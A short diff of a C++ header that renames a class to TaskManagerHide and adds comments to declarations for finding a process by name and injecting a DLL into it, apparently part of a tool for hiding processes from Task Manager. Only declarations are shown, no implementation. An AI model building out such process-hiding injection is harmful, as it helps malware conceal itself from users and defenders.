@@ -12,15 +12,22 @@
 
 
 
-class TaskManager
+class TaskManagerHide
 {
 public:
+	/*
+	the function start the actoin
+	*/
 	void start();
+	/*
+	the function find all the process with `name`
+	*/
 	void findProcess(const char* name);
 private:
+	/*
+	the function inject the dll to the process
+	*/
 	void injectProcess(HANDLE);
 	
 	HANDLE _thread;
 };
-
-static TaskManager taskManager;
